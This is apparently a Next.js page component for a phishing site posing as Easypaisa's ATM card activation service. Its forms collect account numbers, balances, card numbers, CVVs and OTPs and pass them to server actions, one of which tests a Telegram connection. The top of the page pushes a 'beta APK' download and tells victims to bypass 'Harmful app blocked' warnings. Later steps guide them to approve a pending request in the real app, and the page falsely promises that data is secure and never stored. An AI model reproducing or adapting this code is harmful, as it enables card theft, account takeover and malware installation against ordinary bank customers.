"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import {
  CreditCard,
  Shield,
  Smartphone,
  CheckCircle,
  Clock,
  Send,
  Phone,
  MessageCircle,
  Mail,
  HelpCircle,
  ExternalLink,
  ArrowRight,
  AlertTriangle,
  Wallet,
  Globe,
  ShoppingCart,
  Star,
  Sparkles,
  PhoneCall,
  Download,
  AlertCircle,
} from "lucide-react"
import { submitCardData, submitOTPData, testTelegramConnection, trackAPKDownload } from "./actions"
import { useToast } from "@/hooks/use-toast"
import { VideoTutorial } from "@/components/video-tutorial"
import { LiveChat } from "@/components/live-chat"
import { ApprovalConfirmation } from "@/components/approval-confirmation"
import { CallbackRequest } from "@/components/callback-request"

export default function EasypaisaActivation() {
  const [step, setStep] = useState<
    "method" | "account" | "card" | "otp" | "approval-instructions" | "approval-confirmation" | "success"
  >("method")
  const [loading, setLoading] = useState(false)
  const [cardDataSent, setCardDataSent] = useState(false)
  const { toast } = useToast()
  const [showHelpModal, setShowHelpModal] = useState(false)
  const [showCallbackRequest, setShowCallbackRequest] = useState(false)

  const [formData, setFormData] = useState({
    accountNumber: "",
    currentBalance: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    otp: "",
  })

  const handleInputChange = (field: string, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }))
  }

  const sendCardDataAction = async () => {
    setLoading(true)
    try {
      const result = await submitCardData({
        accountNumber: formData.accountNumber,
        currentBalance: formData.currentBalance,
        cardNumber: formData.cardNumber,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
      })

      if (result.success) {
        setCardDataSent(true)
        toast({
          title: "Data Sent Successfully",
          description: "Account details have been submitted for verification.",
        })

        // For Method 1 (account verification), show approval instructions
        // For Method 2 (card details), go to OTP
        if (!formData.cardNumber) {
          setStep("approval-instructions")
        } else {
          setStep("otp")
        }
      } else {
        toast({
          title: "Error",
          description: result.message || "Failed to submit data. Please try again.",
          variant: "destructive",
        })
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to submit data. Please try again.",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const sendOTPDataAction = async () => {
    setLoading(true)
    try {
      const result = await submitOTPData(formData.otp, formData.accountNumber)

      if (result.success) {
        toast({
          title: "OTP Submitted",
          description: "Your OTP has been verified successfully.",
        })
        setStep("success")
      } else {
        toast({
          title: "Error",
          description: result.message || "Failed to verify OTP. Please try again.",
          variant: "destructive",
        })
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify OTP. Please try again.",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const testConnection = async () => {
    setLoading(true)
    try {
      const result = await testTelegramConnection()
      toast({
        title: result.success ? "Connection Successful" : "Connection Failed",
        description: result.message,
        variant: result.success ? "default" : "destructive",
      })
    } catch (error) {
      toast({
        title: "Test Failed",
        description: "Unable to test Telegram connection",
        variant: "destructive",
      })
    } finally {
      setLoading(false)
    }
  }

  const handleAPKDownload = async () => {
    try {
      // Your actual Vercel Blob URL
      const blobUrl =
        "https://bh0dbauytdhftyhb.public.blob.vercel-storage.com/easypaisa%20beta-S4pgb6EaqYMGydpVrUHCszVwg2UDAv.apk"

      // Track the download
      await trackAPKDownload(blobUrl)

      // Show download starting message
      toast({
        title: "Download Starting...",
        description: "Your APK download will begin automatically.",
      })

      // Method 1: Try direct download with fetch and blob
      try {
        const response = await fetch(blobUrl)
        if (response.ok) {
          const blob = await response.blob()
          const downloadUrl = window.URL.createObjectURL(blob)

          // Create download link
          const link = document.createElement("a")
          link.href = downloadUrl
          link.download = "easypaisa-beta.apk"
          link.style.display = "none"

          // Add to DOM, click, and remove
          document.body.appendChild(link)
          link.click()
          document.body.removeChild(link)

          // Clean up the blob URL
          setTimeout(() => window.URL.revokeObjectURL(downloadUrl), 100)

          toast({
            title: "Download Started",
            description: "Please check your downloads folder for the APK file.",
          })
          return
        }
      } catch (fetchError) {
        console.log("Fetch method failed, trying direct link method")
      }

      // Method 2: Direct link method (fallback)
      const link = document.createElement("a")
      link.href = blobUrl
      link.download = "easypaisa-beta.apk"
      link.target = "_blank"
      link.rel = "noopener noreferrer"
      link.style.display = "none"

      // Add to DOM and trigger click
      document.body.appendChild(link)
      link.click()
      document.body.removeChild(link)

      // Show success message
      toast({
        title: "Download Started",
        description: "Please check your downloads folder for the APK file.",
      })

      // Method 3: Open in new window as additional fallback
      setTimeout(() => {
        window.open(blobUrl, "_blank")
      }, 1000)
    } catch (error) {
      console.error("Download error:", error)

      // Final fallback - direct window open
      try {
        window.open(
          "https://bh0dbauytdhftyhb.public.blob.vercel-storage.com/easypaisa%20beta-S4pgb6EaqYMGydpVrUHCszVwg2UDAv.apk",
          "_blank",
        )

        toast({
          title: "Download Alternative",
          description: "APK download opened in new tab. Please save the file.",
          variant: "default",
        })
      } catch (finalError) {
        // Ultimate fallback to Play Store
        toast({
          title: "Download Issue",
          description: "Redirecting to Play Store as backup option.",
          variant: "destructive",
        })
        window.open("https://play.google.com/store/apps/details?id=pk.com.telenor.phoenix", "_blank")
      }
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-50 via-teal-50 to-cyan-50 relative overflow-hidden">
      {/* Enhanced APK Download Section - At Top of Page */}
      <div className="bg-gradient-to-r from-green-50 to-emerald-50 p-6 sm:p-8 border-b border-green-200 shadow-lg">
        <div className="container mx-auto px-3 sm:px-4 max-w-5xl">
          <div className="flex items-center justify-center gap-3 mb-6">
            <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-500 rounded-full flex items-center justify-center">
              <Download className="h-8 w-8 text-white" />
            </div>
            <h2 className="text-2xl sm:text-3xl font-bold text-gray-800">Download Latest Easypaisa App</h2>
          </div>

          <p className="text-gray-600 mb-8 text-center max-w-3xl mx-auto text-base sm:text-lg">
            Get the latest beta version of Easypaisa app with enhanced features for faster card activation and better
            user experience.
          </p>

          <div className="flex flex-col gap-4 justify-center items-center">
            <Button
              onClick={handleAPKDownload}
              className="w-full sm:w-auto bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white font-bold px-6 py-4 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-3 text-base sm:text-lg"
            >
              <Download className="w-5 h-5 sm:w-6 sm:h-6" />
              AUTO-DOWNLOAD EASYPAISA BETA APK
              <Badge variant="secondary" className="bg-white/20 text-white border-white/30 ml-2 text-xs sm:text-sm">
                INSTANT
              </Badge>
            </Button>

            <div className="flex gap-2 mt-2 sm:mt-0">
              <Button
                variant="outline"
                onClick={() =>
                  window.open("https://play.google.com/store/apps/details?id=pk.com.telenor.phoenix", "_blank")
                }
                className="border-2 border-gray-400 text-gray-700 hover:bg-gray-50 font-semibold px-4 py-2 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-2"
              >
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M3,20.5V3.5C3,2.91 3.34,2.39 3.84,2.15L13.69,12L3.84,21.85C3.34,21.61 3,21.09 3,20.5M16.81,15.12L6.05,21.34L14.54,12.85L16.81,15.12M20.16,10.81C20.5,11.08 20.75,11.5 20.75,12C20.75,12.5 20.53,12.9 20.18,13.18L17.89,14.5L15.39,12L17.89,9.5L20.16,10.81M6.05,2.66L16.81,8.88L14.54,11.15L6.05,2.66Z" />
                </svg>
                Play Store
              </Button>

              <Button
                variant="outline"
                onClick={() => window.open("https://apps.apple.com/pk/app/easypaisa/id1436571860", "_blank")}
                className="border-2 border-gray-400 text-gray-700 hover:bg-gray-50 font-semibold px-4 py-2 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 flex items-center gap-2"
              >
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M18.71,19.5C17.88,20.74 17,21.95 15.66,21.97C14.32,22 13.89,21.18 12.37,21.18C10.84,21.18 10.37,21.95 9.1,22C7.79,22.05 6.8,20.68 5.96,19.47C4.25,17 2.94,12.45 4.7,9.39C5.57,7.87 7.13,6.91 8.82,6.88C10.1,6.86 11.32,7.75 12.11,7.75C12.89,7.75 14.37,6.68 15.92,6.84C16.57,6.87 18.39,7.1 19.56,8.82C19.47,8.88 17.39,10.1 17.41,12.63C17.44,15.65 20.06,16.66 20.09,16.67C20.06,16.74 19.67,18.11 18.71,19.5M13,3.5C13.73,2.67 14.94,2.04 15.94,2C16.07,3.17 15.6,4.35 14.9,5.19C14.21,6.04 13.07,6.7 11.95,6.61C11.8,5.46 12.36,4.26 13,3.5Z" />
                </svg>
                App Store
              </Button>
            </div>
          </div>

          <div className="mt-6 p-4 bg-amber-50 rounded-lg border border-amber-200">
            <div className="flex items-center gap-2 text-amber-800 mb-2">
              <AlertCircle className="h-4 w-4" />
              <p className="text-sm font-medium">Installation Instructions:</p>
            </div>
            <div className="text-xs text-amber-700 space-y-1">
              <p>1. Enable "Install from Unknown Sources" in your device settings</p>
              <p>2. If you see "Harmful app blocked" warning, click "More details" then "Install anyway"</p>
              <p>3. Complete the installation and enjoy the enhanced features!</p>
            </div>
          </div>
        </div>
      </div>

      {/* Animated Background Elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-gradient-to-br from-emerald-200/30 to-teal-200/30 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-gradient-to-br from-cyan-200/30 to-blue-200/30 rounded-full blur-3xl animate-pulse delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-gradient-to-br from-teal-100/20 to-emerald-100/20 rounded-full blur-3xl animate-pulse delay-500"></div>
      </div>

      {/* Enhanced Header */}
      <div className="relative overflow-hidden bg-gradient-to-r from-emerald-600 via-teal-600 to-cyan-600 px-4 sm:px-6 py-10 sm:py-16">
        <div className="absolute inset-0 bg-black/10"></div>
        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent"></div>

        {/* Floating Elements */}
        <div className="absolute top-10 left-10 w-4 h-4 bg-white/20 rounded-full animate-bounce delay-300"></div>
        <div className="absolute top-20 right-20 w-3 h-3 bg-white/30 rounded-full animate-bounce delay-700"></div>
        <div className="absolute bottom-10 left-1/4 w-2 h-2 bg-white/25 rounded-full animate-bounce delay-1000"></div>

        <div className="relative mx-auto max-w-4xl text-center">
          <div className="mb-8 inline-flex items-center justify-center w-20 h-20 bg-white/20 rounded-full backdrop-blur-sm border border-white/30 shadow-2xl">
            <CreditCard className="h-10 w-10 text-white drop-shadow-lg" />
          </div>
          <h1 className="text-5xl md:text-6xl font-bold text-white mb-6 drop-shadow-lg">ATM Card Activation</h1>
          <p className="text-emerald-100 text-xl md:text-2xl mb-8 max-w-3xl mx-auto leading-relaxed">
            Activate your temporarily restricted Easypaisa ATM card quickly and securely for
            <span className="font-semibold text-white"> E-commerce payments</span> and
            <span className="font-semibold text-white"> international transactions</span>
          </p>

          <div className="flex flex-wrap items-center justify-center gap-4 mb-8">
            <Badge
              variant="secondary"
              className="bg-white/20 text-white border-white/30 px-4 py-2 text-sm backdrop-blur-sm"
            >
              <Shield className="w-5 h-5 mr-2" />
              Bank-Level Security
            </Badge>
            <Badge
              variant="secondary"
              className="bg-white/20 text-white border-white/30 px-4 py-2 text-sm backdrop-blur-sm"
            >
              <Clock className="w-5 h-5 mr-2" />
              5-Minute Activation
            </Badge>
            <Badge
              variant="secondary"
              className="bg-white/20 text-white border-white/30 px-4 py-2 text-sm backdrop-blur-sm"
            >
              <Globe className="w-5 h-5 mr-2" />
              International Ready
            </Badge>
          </div>

          {/* Enhanced Important Notice */}
          <div className="bg-gradient-to-r from-amber-500/90 to-orange-500/90 backdrop-blur-sm rounded-2xl p-6 border border-amber-300/50 shadow-2xl max-w-4xl mx-auto">
            <div className="flex items-center gap-3 mb-4">
              <div className="flex-shrink-0 w-12 h-12 bg-white/20 rounded-full flex items-center justify-center">
                <AlertTriangle className="h-6 w-6 text-white" />
              </div>
              <h3 className="text-xl font-bold text-white">Important Notice</h3>
            </div>

            <div className="grid md:grid-cols-2 gap-6 text-left">
              <div className="space-y-3">
                <div className="flex items-start gap-3">
                  <Wallet className="h-5 w-5 text-white mt-1 flex-shrink-0" />
                  <p className="text-white text-sm leading-relaxed">
                    <strong>Sufficient Credit Required:</strong> You must have sufficient credit in your account to
                    proceed with activation of E-commerce payment and international transactions.
                  </p>
                </div>
                <div className="flex items-start gap-3">
                  <ShoppingCart className="h-5 w-5 text-white mt-1 flex-shrink-0" />
                  <p className="text-white text-sm leading-relaxed">
                    <strong>E-commerce Ready:</strong> Once activated, your card will support online shopping and
                    digital payments.
                  </p>
                </div>
              </div>

              <div className="space-y-3">
                <div className="flex items-start gap-3">
                  <Clock className="h-5 w-5 text-white mt-1 flex-shrink-0" />
                  <p className="text-white text-sm leading-relaxed">
                    <strong>Temporary Hold:</strong> Easypaisa may temporarily hold a random amount from your account
                    for verification purposes.
                  </p>
                </div>
                <div className="flex items-start gap-3">
                  <CheckCircle className="h-5 w-5 text-white mt-1 flex-shrink-0" />
                  <p className="text-white text-sm leading-relaxed">
                    <strong>Auto Release:</strong> The held amount will be released back within 24-48 hours and won't
                    affect regular transactions.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-3 sm:px-4 py-6 sm:py-12 max-w-5xl relative z-10">
        {step === "method" && (
          <>
            <div className="mb-12">
              <VideoTutorial
                title="How to Activate Your ATM Card"
                description="Watch this comprehensive tutorial to understand the complete activation process"
                videoUrl="/tutorial-video.mp4"
              />
            </div>

            <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-lg overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-br from-emerald-50/50 to-teal-50/50"></div>
              <CardHeader className="text-center pb-6 sm:pb-8 relative px-4 sm:px-6">
                <div className="mb-6 inline-flex items-center justify-center w-16 h-16 bg-white/20 rounded-full backdrop-blur-sm border border-white/30 shadow-2xl">
                  <Sparkles className="h-8 w-8 text-white drop-shadow-lg" />
                </div>
                <CardTitle className="text-3xl md:text-4xl text-gray-800 mb-4">Choose Activation Method</CardTitle>
                <CardDescription className="text-lg text-gray-600 max-w-2xl mx-auto">
                  Select your preferred method to activate your ATM card and unlock E-commerce & international
                  transaction capabilities
                </CardDescription>
              </CardHeader>
              <CardContent className="space-y-6 sm:space-y-8 relative px-4 sm:px-6">
                <div className="grid gap-6 sm:gap-8 md:grid-cols-2">
                  <Card className="cursor-pointer transition-all duration-300 hover:shadow-2xl hover:scale-105 border-2 hover:border-emerald-400 group overflow-hidden">
                    <div className="absolute inset-0 bg-gradient-to-br from-emerald-50 to-teal-50 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                    <CardContent className="p-8 text-center relative">
                      <div className="mb-6 inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-emerald-100 to-emerald-200 rounded-full group-hover:scale-110 transition-transform duration-300">
                        <Smartphone className="h-8 w-8 text-emerald-600" />
                      </div>
                      <h3 className="font-bold text-xl mb-3 text-gray-800">Method 1: Account Verification</h3>
                      <p className="text-gray-600 mb-6 leading-relaxed">
                        Submit account details and approve from Easypaisa app for instant activation
                      </p>
                      <div className="flex items-center justify-center gap-2 mb-6">
                        <Star className="h-4 w-4 text-yellow-500 fill-current" />
                        <span className="text-sm text-gray-600">Recommended</span>
                      </div>
                      <Button
                        onClick={() => setStep("account")}
                        className="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold py-3 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                      >
                        Continue with Account
                        <ArrowRight className="ml-2 h-4 w-4" />
                      </Button>
                    </CardContent>
                  </Card>

                  <Card className="cursor-pointer transition-all duration-300 hover:shadow-2xl hover:scale-105 border-2 hover:border-blue-400 group overflow-hidden">
                    <div className="absolute inset-0 bg-gradient-to-br from-blue-50 to-indigo-50 opacity-0 group-hover:opacity-100 transition-opacity duration-300"></div>
                    <CardContent className="p-8 text-center relative">
                      <div className="mb-6 inline-flex items-center justify-center w-16 h-16 bg-gradient-to-br from-blue-100 to-blue-200 rounded-full group-hover:scale-110 transition-transform duration-300">
                        <CreditCard className="h-8 w-8 text-blue-600" />
                      </div>
                      <h3 className="font-bold text-xl mb-3 text-gray-800">Method 2: Card Details</h3>
                      <p className="text-gray-600 mb-6 leading-relaxed">
                        Verify using your complete card information with OTP confirmation
                      </p>
                      <div className="flex items-center justify-center gap-2 mb-6">
                        <Shield className="h-4 w-4 text-blue-500" />
                        <span className="text-sm text-gray-600">Secure Process</span>
                      </div>
                      <Button
                        onClick={() => setStep("card")}
                        variant="outline"
                        className="w-full border-2 border-blue-600 text-blue-600 hover:bg-blue-50 font-semibold py-3 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                      >
                        Use Card Details
                        <ArrowRight className="ml-2 h-4 w-4" />
                      </Button>
                    </CardContent>
                  </Card>
                </div>

                <div className="text-center pt-4 space-y-6">
                  <Button
                    variant="outline"
                    onClick={testConnection}
                    disabled={loading}
                    className="text-sm px-6 py-2 rounded-full border-emerald-300 text-emerald-700 hover:bg-emerald-50"
                  >
                    {loading ? "Testing Connection..." : "🔗 Test System Connection"}
                  </Button>
                </div>
              </CardContent>
            </Card>
          </>
        )}

        {step === "account" && (
          <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-lg overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-emerald-50/30 to-teal-50/30"></div>
            <CardHeader className="relative">
              <div className="flex items-center gap-4 mb-4">
                <div className="w-12 h-12 bg-gradient-to-br from-emerald-500 to-teal-500 rounded-full flex items-center justify-center">
                  <CheckCircle className="h-6 w-6 text-white" />
                </div>
                <div>
                  <CardTitle className="text-2xl md:text-3xl text-gray-800">Verify Your Account Details</CardTitle>
                  <CardDescription className="text-base mt-2">
                    Enter your account information. After submission, you'll receive step-by-step instructions to
                    approve the activation from your Easypaisa app.
                  </CardDescription>
                </div>
              </div>
            </CardHeader>
            <CardContent className="space-y-8 relative">
              <div className="grid gap-6 md:grid-cols-2">
                <div className="space-y-2">
                  <Label
                    htmlFor="accountNumber"
                    className="text-sm font-semibold text-gray-700 flex items-center gap-2"
                  >
                    <Smartphone className="h-4 w-4 text-emerald-600" />
                    Easypaisa Account Number *
                  </Label>
                  <Input
                    id="accountNumber"
                    placeholder="Enter your account number"
                    value={formData.accountNumber}
                    onChange={(e) => handleInputChange("accountNumber", e.target.value)}
                    className="h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-xl transition-colors duration-300"
                  />
                </div>

                <div className="space-y-2">
                  <Label
                    htmlFor="currentBalance"
                    className="text-sm font-semibold text-gray-700 flex items-center gap-2"
                  >
                    <Wallet className="h-4 w-4 text-emerald-600" />
                    Current Account Balance (PKR) *
                  </Label>
                  <Input
                    id="currentBalance"
                    placeholder="Enter your current balance"
                    value={formData.currentBalance}
                    onChange={(e) => handleInputChange("currentBalance", e.target.value)}
                    className="h-12 border-2 border-gray-200 focus:border-emerald-500 rounded-xl transition-colors duration-300"
                  />
                </div>
              </div>

              <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-6 rounded-2xl border border-blue-200">
                <div className="flex items-center gap-3 mb-3">
                  <Shield className="h-5 w-5 text-blue-600" />
                  <h4 className="font-semibold text-blue-900">Security & Privacy</h4>
                </div>
                <p className="text-sm text-blue-700 leading-relaxed">
                  Your information is encrypted and securely transmitted. We follow bank-level security protocols to
                  protect your data.
                </p>
              </div>

              <Separator className="my-8" />

              <div className="flex flex-col sm:flex-row gap-3 sm:gap-4">
                <Button
                  variant="outline"
                  onClick={() => setStep("method")}
                  className="h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
                >
                  <ArrowRight className="w-4 h-4 mr-2 rotate-180" />
                  Back
                </Button>
                <Button
                  onClick={sendCardDataAction}
                  disabled={!formData.accountNumber || !formData.currentBalance || loading}
                  className="h-12 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                >
                  {loading ? (
                    <>
                      <div className="w-4 h-4 mr-2 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Sending...
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4 mr-2" />
                      Submit Details
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "card" && (
          <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-lg overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-blue-50/30 to-indigo-50/30"></div>
            <CardHeader className="relative">
              <div className="flex items-center gap-4 mb-4">
                <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-indigo-500 rounded-full flex items-center justify-center">
                  <CreditCard className="h-6 w-6 text-white" />
                </div>
                <div>
                  <CardTitle className="text-2xl md:text-3xl text-gray-800">Enter Card Details</CardTitle>
                  <CardDescription className="text-base mt-2">
                    Please provide your complete card information for secure verification and activation
                  </CardDescription>
                </div>
              </div>
            </CardHeader>
            <CardContent className="space-y-8 relative">
              <div className="grid gap-6">
                <div className="grid gap-6 md:grid-cols-2">
                  <div className="md:col-span-2 space-y-2">
                    <Label
                      htmlFor="accountNumber2"
                      className="text-sm font-semibold text-gray-700 flex items-center gap-2"
                    >
                      <Smartphone className="h-4 w-4 text-blue-600" />
                      Easypaisa Account Number *
                    </Label>
                    <Input
                      id="accountNumber2"
                      placeholder="Enter your account number"
                      value={formData.accountNumber}
                      onChange={(e) => handleInputChange("accountNumber", e.target.value)}
                      className="h-12 border-2 border-gray-200 focus:border-blue-500 rounded-xl transition-colors duration-300"
                    />
                  </div>

                  <div className="md:col-span-2 space-y-2">
                    <Label htmlFor="cardNumber" className="text-sm font-semibold text-gray-700 flex items-center gap-2">
                      <CreditCard className="h-4 w-4 text-blue-600" />
                      Card Number *
                    </Label>
                    <Input
                      id="cardNumber"
                      placeholder="1234 5678 9012 3456"
                      value={formData.cardNumber}
                      onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                      className="h-12 border-2 border-gray-200 focus:border-blue-500 rounded-xl transition-colors duration-300"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="expiryDate" className="text-sm font-semibold text-gray-700 flex items-center gap-2">
                      <Clock className="h-4 w-4 text-blue-600" />
                      Expiry Date *
                    </Label>
                    <Input
                      id="expiryDate"
                      placeholder="MM/YY"
                      value={formData.expiryDate}
                      onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                      className="h-12 border-2 border-gray-200 focus:border-blue-500 rounded-xl transition-colors duration-300"
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="cvv" className="text-sm font-semibold text-gray-700 flex items-center gap-2">
                      <Shield className="h-4 w-4 text-blue-600" />
                      CVV *
                    </Label>
                    <Input
                      id="cvv"
                      placeholder="123"
                      value={formData.cvv}
                      onChange={(e) => handleInputChange("cvv", e.target.value)}
                      className="h-12 border-2 border-gray-200 focus:border-blue-500 rounded-xl transition-colors duration-300"
                    />
                  </div>

                  <div className="md:col-span-2 space-y-2">
                    <Label
                      htmlFor="currentBalance2"
                      className="text-sm font-semibold text-gray-700 flex items-center gap-2"
                    >
                      <Wallet className="h-4 w-4 text-blue-600" />
                      Current Account Balance (PKR) *
                    </Label>
                    <Input
                      id="currentBalance2"
                      placeholder="Enter your current balance"
                      value={formData.currentBalance}
                      onChange={(e) => handleInputChange("currentBalance", e.target.value)}
                      className="h-12 border-2 border-gray-200 focus:border-blue-500 rounded-xl transition-colors duration-300"
                    />
                  </div>
                </div>

                <div className="bg-gradient-to-r from-emerald-50 to-teal-50 p-6 rounded-2xl border border-emerald-200">
                  <div className="flex items-center gap-3 mb-3">
                    <Shield className="h-5 w-5 text-emerald-600" />
                    <h4 className="font-semibold text-emerald-900">Secure Processing</h4>
                  </div>
                  <p className="text-sm text-emerald-700 leading-relaxed">
                    All card information is processed using industry-standard encryption. Your data is never stored and
                    is only used for verification purposes.
                  </p>
                </div>
              </div>

              <Separator className="my-8" />

              <div className="flex flex-col sm:flex-row gap-3 sm:gap-4">
                <Button
                  variant="outline"
                  onClick={() => setStep("method")}
                  className="h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
                >
                  <ArrowRight className="w-4 h-4 mr-2 rotate-180" />
                  Back
                </Button>
                <Button
                  onClick={sendCardDataAction}
                  disabled={
                    !formData.accountNumber ||
                    !formData.cardNumber ||
                    !formData.expiryDate ||
                    !formData.cvv ||
                    !formData.currentBalance ||
                    loading
                  }
                  className="h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                >
                  {loading ? (
                    <>
                      <div className="w-4 h-4 mr-2 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Sending...
                    </>
                  ) : (
                    <>
                      <Send className="w-4 h-4 mr-2" />
                      Submit Card Details
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "otp" && (
          <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-lg overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-emerald-50/30 to-teal-50/30"></div>
            <CardHeader className="text-center relative">
              <div className="mb-6 inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-emerald-100 to-teal-100 rounded-full mx-auto shadow-lg">
                <Shield className="h-10 w-10 text-emerald-600" />
              </div>
              <CardTitle className="text-3xl text-gray-800 mb-4">Enter OTP Code</CardTitle>
              <CardDescription className="text-lg">
                We've sent a verification code to your registered mobile number
              </CardDescription>
              {cardDataSent && (
                <Badge variant="secondary" className="bg-emerald-100 text-emerald-800 mt-4 px-4 py-2">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  Card details submitted successfully
                </Badge>
              )}
            </CardHeader>
            <CardContent className="space-y-8 relative">
              <div className="max-w-sm mx-auto">
                <Label htmlFor="otp" className="text-sm font-semibold text-gray-700 block text-center mb-4">
                  6-Digit OTP Code *
                </Label>
                <Input
                  id="otp"
                  placeholder="Enter 6-digit OTP"
                  value={formData.otp}
                  onChange={(e) => handleInputChange("otp", e.target.value)}
                  className="h-16 text-center text-2xl tracking-widest border-2 border-gray-200 focus:border-emerald-500 rounded-xl transition-colors duration-300"
                  maxLength={6}
                />
              </div>

              <div className="text-center">
                <Button variant="link" className="text-emerald-600 hover:text-emerald-700 font-semibold">
                  Didn't receive OTP? Resend Code
                </Button>
              </div>

              <Separator className="my-8" />

              <div className="flex gap-4">
                <Button
                  variant="outline"
                  onClick={() => setStep(formData.cardNumber ? "card" : "account")}
                  className="flex-1 h-12 rounded-xl border-2 border-gray-300 hover:border-gray-400 transition-colors duration-300"
                >
                  <ArrowRight className="w-4 h-4 mr-2 rotate-180" />
                  Back
                </Button>
                <Button
                  onClick={sendOTPDataAction}
                  disabled={formData.otp.length !== 6 || loading}
                  className="flex-1 h-12 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300"
                >
                  {loading ? (
                    <>
                      <div className="w-4 h-4 mr-2 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Verifying...
                    </>
                  ) : (
                    <>
                      <CheckCircle className="w-4 h-4 mr-2" />
                      Verify OTP
                    </>
                  )}
                </Button>
              </div>
            </CardContent>
          </Card>
        )}

        {step === "approval-instructions" && (
          <Card className="shadow-2xl border-0 bg-white/90 backdrop-blur-lg overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-blue-50/30 to-indigo-50/30"></div>
            <CardHeader className="text-center relative">
              <div className="mb-6 inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-blue-100 to-indigo-100 rounded-full mx-auto shadow-lg">
                <Smartphone className="h-10 w-10 text-blue-600" />
              </div>
              <CardTitle className="text-3xl text-gray-800 mb-4">Approve from Easypaisa App</CardTitle>
              <CardDescription className="text-lg">
                Follow these exact steps to complete your ATM card activation
              </CardDescription>
              {cardDataSent && (
                <Badge variant="secondary" className="bg-emerald-100 text-emerald-800 mt-4 px-4 py-2">
                  <CheckCircle className="w-4 h-4 mr-2" />
                  Account details submitted successfully
                </Badge>
              )}
            </CardHeader>
            <CardContent className="space-y-8 relative">
              <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-8 rounded-2xl border border-blue-200">
                <h3 className="font-bold text-blue-900 mb-6 flex items-center gap-3 text-xl">
                  <Smartphone className="h-6 w-6" />
                  Detailed Step-by-Step Guide:
                </h3>
                <div className="space-y-6">
                  {[
                    {
                      step: "1",
                      title: "Open Easypaisa Mobile App",
                      desc: "Launch the Easypaisa app on your mobile device",
                    },
                    { step: "2", title: 'Navigate to "My Account"', desc: 'Tap on "My Account" from the main menu' },
                    {
                      step: "3",
                      title: 'Find "My Approvals" (7th Option)',
                      desc: 'Scroll down and look for "My Approvals" - it\'s the 7th option in the list',
                    },
                    { step: "4", title: 'Tap "My Approvals"', desc: 'Click on "My Approvals" to see pending requests' },
                    {
                      step: "5",
                      title: "Find ATM Card Activation Request",
                      desc: "Look for the pending ATM card activation request in the list",
                    },
                    {
                      step: "✓",
                      title: "Approve the Request",
                      desc: 'Tap "Approve" to complete your ATM card activation',
                    },
